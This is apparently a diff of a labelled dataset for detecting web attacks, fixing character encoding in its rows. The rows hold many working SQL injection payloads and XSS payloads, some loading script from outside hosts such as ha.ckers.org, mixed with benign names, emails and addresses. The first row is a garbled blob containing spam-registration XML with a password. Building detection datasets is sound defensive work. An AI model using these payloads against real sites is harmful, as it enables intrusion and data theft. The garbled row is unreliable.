TzwvXJPEcaaOZ9DhJ0@V$K@6DPV+YkQBHbJYSMo@V$Kw@fykXPjdnQQrXTvasdfSr@V$K@c1LOcyiCkFas+XHzbo@V$K@LIHG/+VLgv8RRGR01123@V$K@TzwvXJPEcOZ9DhJ0@V$K@uiGFBm0312rIUaiuBxk UWxvAe743xrPY10JM@V$K@rojWCf7y+OXORcBK@V$Kv@0AIa2oYla5Nt1ckw3@V$K@GMPMso40NCSoArEA V V0hYD71LOy24uhiN4N@3V$K@L5VSRxv4oDXwH+hZ@Vsdf$K@znwrm3vjnUyJBkle@V$K@OuJAnfBzCHbLSge1 VISITVIEW WJyyJ+94QQ2bZbMjn@V$K@kyzIU123+92FxfeBsdfaTn@V$K@3GcBPScFJ6QQEw12gn@V$K@kyzIU+92FsdxfeBaTn@V$K@kNefOsew6E+LZCD51r@V$K@WJyyJ+94Q4asdfkQbZbMjn@V123$K@WJyyJ+94QQbZbMjn WlDxZ/Xl9Gqymv123SWnoZdkHQ  =    =   WnuIfx55kZ XQg12SK2QaeLWOadsfsa124yeMxePT1Pg  =    =   Y Y&check_name Y,Y,Y,Y,Y,Y,Y,Y,Y,Y,Y,Y Y29k123ZT1mcmVlJnNlYXJjaasdvFa9pdGVtPSZzZWFyY2hfb3JkZXI9JnVuc2luZ2NvZGUxPTEyNTc3NTU2OTEkljoimdW5zasadfW5nY29kZTI9MTI1Nzc1NTc4123OCZ1asdfbnNpbmdjb232Rl41Mz0mY2F0ZT0mcHdkPQ  =    =  || Y29kZTasdf1xbmEmc2VcwehcmNoX2l0ZW09JnNlYXJjaF9vcmRlcasdj0mdW5zaW5nY29kZTE9MTIc131Nzc1NTY5MSZ1bnNpbmdjb2RlMj0xMjU3NzU1NzczJnVuc2412sasdfqluZ2NvasdfpwZGUzPSZjYXRlPSZwd2Q9|| YM YYkswPo6JL4ZZMkx@V$K@JnrdZp35dfasbHSPasldfp1123x571@V$K@7QbUi7a/9aCtxupAas;ldf@V$K@7QbUi7a/9aCtxupA@V$Ks;dlfsalkl;k@jW4BJJFvS0sJfNr9@V$K@YYkswPo6JL4ZZMkx@V$asdlkfjK@cM7J0WfRkiELyEje YcrJWg5O Yfrhmym9asdfkHyKybz9y@V$K@7asdlfksaldfXRKgdViFaBwTq7N@V$K@Yfrhmym9HyasldfkpoKybz9y@V$K@ZIKXXH1fCD3qlt7L add again_loan_Mobile agree_10_1 agree_20_1 agree_20_2 agree_30_1 agree_30_2 agree_30_3 agree_30_4 agree_40_1 agree_40_2 and1 ap14 application apply2 checkPwd",sqli
+"de]]>  </email_address>   <find_account_answer>  <![CDATA[fqaepqdkct]]>  </find_account_answer>   <find_account_question>  <![CDATA[6]]>  </find_account_question>   <homepage>  <![CDATA[]]>  </homepage>   <is_secret>  <![CDATA[]]>  </is_secret>   <methodCall>   <mid>  <![CDATA[qna]]>  </mid>   <module>  <![CDATA[member]]>  </module>   <nick_name>  <![CDATA[ElwoodBuckley041104]]>  </nick_name>   <params>   <password2>  <![CDATA[Yxg6dsF5iU]]>  </password2>   <password>  <![CDATA[Yxg6dsF5iU]]>  </password>   <reward_point>  <![CDATA[0]]>  </reward_point>   <title>  <![CDATA[Ways To Make Cash Online - Make Money From Home]]>  </title>   <user_id>  <![CDATA[ElwoodBuckley041104]]>  </user_id>   <user_name>  <![CDATA[ElwoodBuckley041104]]>  </user_name>    =    =     =    =  01 @7520 A3B10 A3B12C41 A3B12C411 APP AR-203 ASCd AgAHMzM3MsdfjMwMExG6Pvz1i3DhGd7DSt5Ve9Qu/n91BdfdEB5EbdeO/M5lphLOo5yOn/ZyS1jabRmzu2WUHoScLEwJjaDz2yHm9tJWbLuELC/JM8Eix/VtyWmMO5osa8FbYZnPanAxI7Ty0n7avQytu2rEK2F+N+C390zLVThtSXL1Isk49OSEWuEAzdaRlmLUWcpx6XSDjFZ++1cgwEoAILJ9Q5NObm6nYipbGovJ6YZgiEncnT9GU6x6sgKNppX0YgXXmss+0Qi5eXWmDn30UlwjfTbmc+Ta17XLDXGm6f/hiM7f4fde+5c+Pavn9EIZXYe9K6G/GyCM7I0dzjPIsjEOwl96y+fYXoZoJcp79kLwtTy6F1dL1HAs8DSFoIrfoUs7zyFtzgMnV2K0sT68IwWkiof2eM1Xes5nbDzmHOEQZ+loGLF2UBIyGcz4cSCtdZhrJXt7TxSIzeHKYpCgtVhNo4zJDlHo7zpUnR+8dSlUsdf18e08zs4iGMRK43bhv6oGA6dUw/dX+exrGTL+NMOThQUQvFdYNsc+AFGWo3PqLFhjQ9s3RzK5krr6II3e2vKhs36q7NgNgaIlQNiqNo8cNbE8iVUxZcHhvxaOStpiUN+N9KY4sZ51Ole8offosPb1NqXs3575SXU+1dEpaggUrUJqKjeUM4Hu90KoHmbL2+/zt6Bk+GCnk2WBKJENscEetfLBCBzBGXPlKC7/G5W4k8Gviynn4qCUoD9FvagtKTTF4MaA5rZtrKRabUae++259WRUZ3VEHfzjpXLaogS9DoeVHDebAClkkuAdU6F6fa2wFIM58  =   AgAHMzM3MjMwMJnS2WotX5wisoSRNiccx9VSfDnC/TFaDo/9wddE55SqhLOo5yOn/ZyS1jabRmzu2WUHoScLEwJjDz2yHsm9tJWa4Oyj22HdAIrJSshxe0KmKTxD4lBsReQqG6IN3ULz8oaEwMT7lKcx4Ukfep1IwCe7xHXlsW2gCFxdZmh731jKLuFDn/9rcY4AkdgqajLoHmVnLk3uBcTxbQS8XWJJk8++VnGu9toYSualxl0CgjSRgl01ddYqiaVYQOBShAcHCdfbHmbDZIPrPowSVFUAGpYsVDx3fVEdDa8NKRAPMI3wAlq40FqZDdhNXNr70OL9ZRzS82kWdHP8w2hd1KcIheAxDSw4a5FLAjzSWrdjcOvUfJQO5QT/90J19i2IWnuTNIdTzOcf3uVy23sHyWmsBEWHyaSsKDm7dfOPPwHIWamQKkdcm5KoWp/FgoIR09S0cn/BZzLOsdcFSbhYOxA  =    =   B_qna B_solution Bn2GepSdoAsdfe4V4a1@V$K@Bn2GepSdoAe4V4a1@23V$K@PlVEBnTVHAYa01hH@V$K@eTZyMZ0F3YBl4Ozr@V$K@Bn2GepSdoAe4V4a1@V$K@xJ8t+K+x1e6/nqCp@V$a1K@PLnd8fSYoXD3QL3s Board00001 C CYsdfSL7J/aXGaV/30TU412JWfjHA  =    =   Cont Content-Disposi Content-Disposition: form- Content-Disposition: form-data; name  =  ""app"" Content-Disposition: form-data; name  =  ""cd_loan_type"" Content-Disposition: form-data; name  =  ""id_finance"" Content-Disposition: form-data; name  =  ""mode"" Content-Disposition: form-data; name  =  ""no"" Content-Disposition: form-data; name  =  ""no_goods"" Content-Disposition: form-data; name  =  ""path"" Content-Disposition: form-data; name  =  ""pnm"" Content-Disposition: form-data; name  =  ""return_page"" Content-Disposition: form-data; name  =  ""type"" D2 D3 DC-3000 DF Del E EA F1 F4 F5 F6 FG123P8HQ+vasd0pVzD2O+YlD+v1V2g  =    =   FmsdfVDvlXqIVetUIzs@V$K@Vj+fqZ6TuN123pq1X2w@V$K@dqRLntgax88tXGB3@V$K@R43SsinxoXFCKjAy FmVDvlXqIVetUIzs@V$K@n5aESvV0q4Se1iBn8@Vasd$K@M5IvfWDvvs5y1TnouS@V$K@Vj+fqZ6TuNpq1X2w@V$K@fuvKbfOrsGKtsDsdf7l@V$K@ZtgfO1WcVPD67KFos@V$K@dqRLntgax88tXGB3 Free Fun Hf6DNiDdq1xzaB3bdDT@V$512K@MRn61gAqhi0iae213dd@V$K@Hf6DNisdfDxzaB3bdDT@V$K@rSTgzjcYIY7Iirl+@V$K@iTI/NtJsfFTdH8ah@V$K@Hf6DNiDxzaB3bdDT@V$K@EdodGNxPNEYWbWcs JVwH/8xSq6ezJPYt@V$s23K@vPr4I41U8oeym0BEi+@V$K@3WPcTx1mJ5sBdACl@V$K@3WPcTx1mJ5sBdACl@V$K@QpmadUUMPKv2tSJP@V$K@JVwH/8xSq6ezasdfJPYt@V$K@vPr4IU8oeym0BEi+ L-840 360ml Ìä∏Î¶¨Í±∞ L-840 450 Ìä∏Î¶¨Í±∞ L5VSRxv4dfoDXwH+hZ@V$K@T0NO9ASwF7J4gKAh@V$K@VWvmclMqqannOAJf@V$K@ERQVjx2OGeE0Mxdf@V$K@VicBva15FL1xm0WH@Va123$K@T0NO9ASwF7J4gKAh@V$K@VicBva15FL1xm0WH PSC-1 NPP Purchase omnicef without prescri QJt5lWbasdftpJ3yciKW@V$K@Hf6DNi123Dxz1aB3bdDT@V$K@iTI/NtJsfFaTdH8vah@V$K@MRn61gAqhi0iaedd QNA_7 R RandD S SF-1013 SR-600 School TC-100 TP1 TracyJat TzwvXJPEcaaOZ9DhJ0@V$K@6DPV+YkQBHbJYSMo@V$Kw@fykXPjdnQQrXTvasdfSr@V$K@c1LOcyiCkFas+XHzbo@V$K@LIHG/+VLgv8RRGR01123@V$K@TzwvXJPEcOZ9DhJ0@V$K@uiGFBm0312rIUaiuBxk UWxvAe743xrPY10JM@V$K@rojWCf7y+OXORcBK@V$Kv@0AIa2oYla5Nt1ckw3@V$K@GMPMso40NCSoArEA V V0hYD71LOy24uhiN4N@3V$K@L5VSRxv4oDXwH+hZ@Vsdf$K@znwrm3vjnUyJBkle@V$K@OuJAnfBzCHbLSge1 VISITVIEW WJyyJ+94QQ2bZbMjn@V$K@kyzIU123+92FxfeBsdfaTn@V$K@3GcBPScFJ6QQEw12gn@V$K@kyzIU+92FsdxfeBaTn@V$K@kNefOsew6E+LZCD51r@V$K@WJyyJ+94Q4asdfkQbZbMjn@V123$K@WJyyJ+94QQbZbMjn WlDxZ/Xl9Gqymv123SWnoZdkHQ  =    =   WnuIfx55kZ XQg12SK2QaeLWOadsfsa124yeMxePT1Pg  =    =   Y Y&check_name Y,Y,Y,Y,Y,Y,Y,Y,Y,Y,Y,Y Y29k123ZT1mcmVlJnNlYXJjaasdvFa9pdGVtPSZzZWFyY2hfb3JkZXI9JnVuc2luZ2NvZGUxPTEyNTc3NTU2OTEkljoimdW5zasadfW5nY29kZTI9MTI1Nzc1NTc4123OCZ1asdfbnNpbmdjb232Rl41Mz0mY2F0ZT0mcHdkPQ  =    =  || Y29kZTasdf1xbmEmc2VcwehcmNoX2l0ZW09JnNlYXJjaF9vcmRlcasdj0mdW5zaW5nY29kZTE9MTIc131Nzc1NTY5MSZ1bnNpbmdjb2RlMj0xMjU3NzU1NzczJnVuc2412sasdfqluZ2NvasdfpwZGUzPSZjYXRlPSZwd2Q9|| YM YYkswPo6JL4ZZMkx@V$K@JnrdZp35dfasbHSPasldfp1123x571@V$K@7QbUi7a/9aCtxupAas;ldf@V$K@7QbUi7a/9aCtxupA@V$Ks;dlfsalkl;k@jW4BJJFvS0sJfNr9@V$K@YYkswPo6JL4ZZMkx@V$asdlkfjK@cM7J0WfRkiELyEje YcrJWg5O Yfrhmym9asdfkHyKybz9y@V$K@7asdlfksaldfXRKgdViFaBwTq7N@V$K@Yfrhmym9HyasldfkpoKybz9y@V$K@ZIKXXH1fCD3qlt7L add again_loan_Mobile agree_10_1 agree_20_1 agree_20_2 agree_30_1 agree_30_2 agree_30_3 agree_30_4 agree_40_1 agree_40_2 and1 ap14 application apply2 checkPwd",sqli
 <vmlframe xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute;width:100%;height:100% src=%(vml)s#xss></vmlframe>,xss
 84276481l,benign
 "1   )    )     )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (     (  8018  =  8018",sqli
 8703,benign
 39,benign
 "1  )   where 6082  =  6082 and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",sqli
-&lt;IMG SRC=&quot; &amp;#14;� javascript:alert(&apos;XSS&apos;);&quot;&gt;,xss
+&lt;IMG SRC=&quot; &amp;#14;  javascript:alert(&apos;XSS&apos;);&quot;&gt;,xss
 "<div style=""font-family:'foo&#10;;color:red;';"">XXX",xss
 pavlow@permutatucasa.fm,benign
 8.50E+15,benign
@@ -5668,7 +5668,7 @@ joya,benign
 if  (  4947  =  5350  )   select 4947 else drop function ereg--,sqli
 "1'||  (  select 'fraa' from dual where 9140  =  9140 and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x   )    )   ||'",sqli
 2427,benign
-<IFRAME SRC=�http://hacker-site.com/xss.html�>,xss
+<IFRAME SRC=”http://hacker-site.com/xss.html”>,xss
 1'||  (  select 'ydvg' from dual where 7108  =  7108,sqli
 1'   )    )    as bswc where 1635  =  1635 and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --,sqli
 "<body onpagehide body onpagehide=""javascript:javascript:alert(1)""></body onpagehide>",xss
@@ -5761,7 +5761,7 @@ herminda,benign
 "select * from generate_series  (  1134,1134,case when   (  1134  =  4909  )   then 1 else 0 end  )   limit 1--",sqli
 2417,benign
 "1' in boolean mode  )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   #",sqli
-<IMG SRC=�jav ascript:alert(�XSS�);�>,xss
+<IMG SRC=”jav ascript:alert(‘XSS’);”>,xss
 "calle profeta, 96, 2?c",benign
 glyn7,benign
 tomono@esteticadayda.az,benign
@@ -5837,7 +5837,7 @@ murad@magadan.org.pe,benign
 "iif  (  5257  =  5257,1,1/0  )  ",sqli
 &lt;IMG &quot;&quot;&quot;&gt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;&quot;&gt;,xss
 c/ coca de la piera 167,benign
-"""'`>ABC<div style=""font-family:'foo'\x7Dx:expression(javascript:alert(1);/*';"">DEF�",xss
+"""'`>ABC<div style=""font-family:'foo'\x7Dx:expression(javascript:alert(1);/*';"">DEF ",xss
 48710,benign
 <script>javascript:alert(1)</script\x0A,xss
 26111,benign
@@ -5896,7 +5896,7 @@ ilusiva,benign
 "1' where 8083  =  8083 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  --",sqli
 "-1447"" union all select 3013,3013,3013,3013,3013,3013,3013--",sqli
 20e28u6r,benign
-<IMG SRC=jAVasCrIPt:alert(�XSS�)>,xss
+<IMG SRC=jAVasCrIPt:alert(‘XSS’)>,xss
 madrigal puigb,benign
 "1""   )    )     )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and    (    (     (  ""text"" like ""text",sqli
 "<form><button formaction=""javascript:alert(XSS)"">lol",xss
@@ -6051,7 +6051,7 @@ cab,benign
 "1"" or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  ",sqli
 "1' or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and 'lxqz'  =  'lxqz",sqli
 "-3205""  )   union all select 5233,5233,5233,5233#",sqli
-"""<IMG%20SRC=""""jav� � ascript:alert('WXSS');"""">""",xss
+"""<IMG%20SRC=""""jav    ascript:alert('WXSS');"""">""",xss
 persson_mcclanahan@deseoun.km,benign
 <;IFRAME SRC=http://ha.ckers.org/scriptlet.html <;,xss
 -8370'   )    )    or   (  3501  =  6407  )  *6407 and    (    (   'agcm' like 'agcm,sqli
@@ -6069,7 +6069,7 @@ mamakos@palodegolf.com.rw,benign
 30599008s,benign
 37188,benign
 8167,benign
-"""'`>ABC<div style=""font-family:'foo'\x7Dx:expression(javascript:alert(1);/*';"">DEF�",xss
+"""'`>ABC<div style=""font-family:'foo'\x7Dx:expression(javascript:alert(1);/*';"">DEF ",xss
 "1""  )   as jiyl where 4893  =  4893 union all select null,null,null,null,null#",sqli
 "1""   )    )     )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  ""yopd"" like ""yopd",sqli
 "1 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",sqli
@@ -6309,7 +6309,7 @@ lores bigas,benign
 pu128,benign
 "&amount=50.0&currency_code=USD&sender_country=""><script>alert('XSS')</script>",xss
 &filter=%22%20onclick='alert(%22XSS%22)'%20%22&order=ryear&limit=25&option=com_jombib&catid=$catId,xss
-<BODY BACKGROUND=�javascript:alert(�XSS�)�>,xss
+<BODY BACKGROUND=”javascript:alert(‘XSS’)”>,xss
 "ABC<div style=""x:\x0Dexpression(javascript:alert(1)"">DEF",xss
 "1%""   )    )     )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and    (    (     (  ""%""  =  """,sqli
 "iif  (  9229  =  4158,1,1/0  )  ",sqli
@@ -6496,7 +6496,7 @@ c356conio,benign
 &search_tag=hoi%22%3E%3Cbody%20onload=alert%28%22XSS%22%29%3E,xss
 "<A HREF=""http://0x42.0x0000066.0x7.0x93/"">XSS</A>",xss
 "iif  (  6369  =  5881,1,1/0  )  ",sqli
-"<IMG SRC="" &#14;� javascript:alert('XSS');"">",xss
+"<IMG SRC="" &#14;  javascript:alert('XSS');"">",xss
 vallado oliveras,benign
 schwuchow9@viajessolomujeres.bj,benign
 SELECT option_value FROM wp_options WHERE option_name  =  '_houzez_property_status_3142' LIMIT 1,sqli
@@ -6743,7 +6743,7 @@ osada,benign
 6736,benign
 "1'  )   where 6774  =  6774 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",sqli
 """`'><script>\x7Ejavascript:alert(1)</script>",xss
-<INPUT TYPE=�IMAGE� SRC=�javascript:alert(�XSS�);�>,xss
+<INPUT TYPE=”IMAGE” SRC=”javascript:alert(‘XSS’);”>,xss
 <SCRIPT SRC=%(jscript)s?<B>,xss
 select   (  case when   (  9434  =  2780  )   then 9434 else 9434*  (  select 9434 from information_schema.character_sets  )   end  )  #,sqli
 SELECT option_value FROM wp_options WHERE option_name  =  '_options_footer_logo' LIMIT 1,sqli
@@ -6822,7 +6822,7 @@ fisicoqumico,benign
 c/ galvan 98 10?a,benign
 5141,benign
 "<script\x0Atype=""text/javascript"">javascript:alert(1);</script>",xss
-<img/src=`%00` onerror=this.onerror=confirm(1)�,xss
+<img/src=`%00` onerror=this.onerror=confirm(1) ,xss
 "1 or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  # lgoz",sqli
 63829565b,benign
 ramblizo,benign
@@ -6831,7 +6831,7 @@ ramblizo,benign
 "1%'  )   and make_set  (  8403  =  8403,8899  )   and   (  '%'  =  '",sqli
 1'   )    )     )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and    (    (     (  'ljhc'  =  'ljhc,sqli
 "1'   )    )     )   or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (     (  'qpuy'  =  'qpuy",sqli
-"<iframe� src=""&Tab;javascript:prompt(1)&Tab;"">",xss
+"<iframe  src=""&Tab;javascript:prompt(1)&Tab;"">",xss
 "avenida baraain, 51, 1?h",benign
 26143,benign
 corrius,benign
@@ -7013,7 +7013,7 @@ igea,benign
 1oca,benign
 jarandilla de la vera,benign
 "1'   )    )     )   or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (     (  'iaud'  =  'iaud",sqli
-<img/src=`` onerror=this.onerror=confirm(1)�,xss
+<img/src=`` onerror=this.onerror=confirm(1) ,xss
 "  SELECT STR_TO_DATE ( ""August,5,2017"", ""%M %e %Y"" ) ;",sqli
 "-5925  )   where 5758  =  5758 union all select 5758,5758,5758,5758,5758,5758,5758,5758,5758#",sqli
 1' where 2661  =  2661,sqli
@@ -7103,7 +7103,7 @@ ajaraca,benign
 "<SCRIPT a="">'>"" SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",xss
 "select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and    (    (   'btnl'  =  'btnl",sqli
 cuerva,benign
-<script>~'\u0061' ;� \u0074\u0068\u0072\u006F\u0077 ~ \u0074\u0068\u0069\u0073.� \u0061\u006C\u0065\u0072\u0074(~'\u0061')</script U+,xss
+<script>~'\u0061' ;  \u0074\u0068\u0072\u006F\u0077 ~ \u0074\u0068\u0069\u0073.  \u0061\u006C\u0065\u0072\u0074(~'\u0061')</script U+,xss
 dec4mas8xt6,benign
 santa mara de la vega,benign
 select   (  case when   (  4755  =  4784  )   then 1 else 4755*  (  select 4755 from master..sysdatabases  )   end  )  --,sqli
@@ -7280,7 +7280,7 @@ retasac5n,benign
 <iframe src=%(scriptlet)s <,xss
 mathieso,benign
 "<img src onerror /"" '""= alt=javascript:alert(1)//"">",xss
-"�<OBJECT TYPE=""text/x-scriptlet"" DATA=""http://ha.ckers.org/scriptlet.html""></OBJECT>",xss
+" <OBJECT TYPE=""text/x-scriptlet"" DATA=""http://ha.ckers.org/scriptlet.html""></OBJECT>",xss
 "-7041""   )    )     )   union all select 2159,2159,2159,2159,2159--",sqli
 "dos aceras 119,",benign
 """<iframe src=""""vbscript:document.write(""""XSS-XSS-XSS"""");"""">""",xss
@@ -7402,7 +7402,7 @@ rustir,benign
 1'||  (  select 'zoqo' from dual where 2063  =  2063,sqli
 "1   )    )    or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and    (    (   5336  =  5336",sqli
 "&lt;A HREF=\""http&#58;//ha&#46;ckers&#46;org@google\""&gt;XSS&lt;/A&gt;",xss
-<style>*{x:__________(javascript:alert(1))}</style>,xss
+<style>*{x:ｅｘｐｒｅｓｓｉｏｎ(javascript:alert(1))}</style>,xss
 "c/ elvas 112, 13-a",benign
 huertas acosa,benign
 reski.kuberskaya@n340magazin.no,benign
@@ -7853,7 +7853,7 @@ dinelli@alcantarapartners.mt,benign
 1 where 4940  =  4940,sqli
 nickonov,benign
 "SELECT * FROM wp_posts WHERE  ( post_type  =  'page' AND post_status  =  'publish' )  AND post_parent  =  181 ORDER BY wp_posts.post_title ASC LIMIT 0,1",sqli
-"�<OBJECT TYPE=""text/x-scriptlet"" DATA=""http://ha.ckers.org/scriptlet.html""></OBJECT>",xss
+" <OBJECT TYPE=""text/x-scriptlet"" DATA=""http://ha.ckers.org/scriptlet.html""></OBJECT>",xss
 "1 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  ",sqli
 "<meta http-equiv=""refresh"" content=""0;javascript&colon;alert(1)""/>",xss
 "<style></style\x3E<img src=""about:blank"" onerror=javascript:alert(1)//></style>",xss
@@ -7963,11 +7963,11 @@ rosselot azcona,benign
 calle eduard toldra 137 5?a,benign
 ergo226825e,benign
 "<head><base href=""javascript://""></head><body><a href=""/. /,javascript:alert(1)//#"">XXX</a></body>",xss
-�><s�%2b�cript>alert(document.cookie)</script>,xss
+“><s”%2b”cript>alert(document.cookie)</script>,xss
 1157,benign
 cnico,benign
 "1'  )   where 3579  =  3579   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )  --",sqli
-"�<HEAD><META HTTP-EQUIV=""CONTENT-TYPE"" CONTENT=""text/html; charset=UTF-7""> </HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-",xss
+" <HEAD><META HTTP-EQUIV=""CONTENT-TYPE"" CONTENT=""text/html; charset=UTF-7""> </HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-",xss
 &query=Search-word%3Cscript%3Ealert('Sup%20reddit,xss
 ben,benign
 "-2951"" or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   ",sqli
@@ -8438,7 +8438,7 @@ baxie,benign
 ribadesella,benign
 "1%""   )    )     )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and    (    (     (  ""%""  =  """,sqli
 -4262%'   )    )     )   or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  '%'  =  ',sqli
-"<DIV STYLE=""background-image: url(http://ha.ckers.org/xss.js)"">Div Body</DIV>�",xss
+"<DIV STYLE=""background-image: url(http://ha.ckers.org/xss.js)"">Div Body</DIV> ",xss
 "-6680%""   )    )    union all select 3719,3719,3719,3719,3719,3719,3719,3719,3719--",sqli
 "-3361'||  (  select 'msfi' where 4806  =  4806 union all select 4806,4806,4806,4806,4806,4806,4806,4806,4806--",sqli
 1'||  (  select 'ywfo' from dual where 4168  =  4168 rlike sleep  (  5  )  #,sqli
@@ -8492,7 +8492,7 @@ trincha-32r1,benign
 &c=SXM_Channel_C&childpagename=SXM%2FSXM_Channel_C%2FChannelDetail&cid=--><script>alert('0');</script>&pagename=SXM%2FWrapper,xss
 "1' where 8950  =  8950 or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",sqli
 8.03E+15,benign
-_script_alert(�XSS�)_/script_,xss
+¼script¾alert(¢XSS¢)¼/script¾,xss
 2.39E+15,benign
 "select count  (  *  )   from generate_series  (  1,5000000  )   and   (  'tnvm' like 'tnvm",sqli
 "<SCRIPT a="">"" '' SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",xss
@@ -8894,7 +8894,7 @@ SELECT * FROM dirty WHERE fellow  BETWEEN 10 AND 20,sqli
 "1'   )    )     )   procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (     (  'dzzx'  =  'dzzx",sqli
 1' where 8469  =  8469,sqli
 1'   )    )     )   and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  'cgiu'  =  'cgiu,sqli
-"<div� style=""position:absolute;top:0;left:0;width:100%;height:100%""� onmouseover=""prompt(1)"" onclick=""alert(1)"">x</button>_",xss
+"<div  style=""position:absolute;top:0;left:0;width:100%;height:100%""  onmouseover=""prompt(1)"" onclick=""alert(1)"">x</button>​",xss
 -5147 or   (  8459  =  8459  )  *4906,sqli
 <~/XSS STYLE=xss:expression(alert('XSS'))>,xss
 "<script>({set/**/$($){_/**/setter=$,_=javascript:alert(1)}}).$=eval</script>",xss
@@ -9002,7 +9002,7 @@ SELECT option_value FROM wp_options WHERE option_name  =  'options_number_of_pre
 65658514t,benign
 jeft,benign
 "1%'   )    )    and elt  (  4249  =  4249,7259  )   and    (    (   '%'  =  '",sqli
-"<var onmouseover=""prompt(1)"">On Mouse Over</var>_",xss
+"<var onmouseover=""prompt(1)"">On Mouse Over</var>​",xss
 8.32E+15,benign
 "<object id=""x"" classid=""clsid:CB927D12-4FF7-4a9e-A169-56E4B8A75598""></object> <object classid=""clsid:02BF25D5-8C17-4B23-BC80-D3488ABDDC6B"" onqt_error=""javascript:alert(1)"" style=""behavior:url(#x);""><param name=postdomevents /></object>",xss
 SELECT * FROM thee WHERE shaking NOT LIKE '[kill]%',sqli
@@ -9081,7 +9081,7 @@ manducatoria,benign
 crcova valentini,benign
 6ar10l30,benign
 "<video><source onerror=""javascript:javascript:alert(1)"">",xss
-<img/src=`%00` onerror=this.onerror=confirm(1)�,xss
+<img/src=`%00` onerror=this.onerror=confirm(1) ,xss
 "<img src\x12=x onerror=""javascript:alert(1)"">",xss
 "<IMG SRC=x onerror=""alert(String.fromCharCode(88,83,83))"">",xss
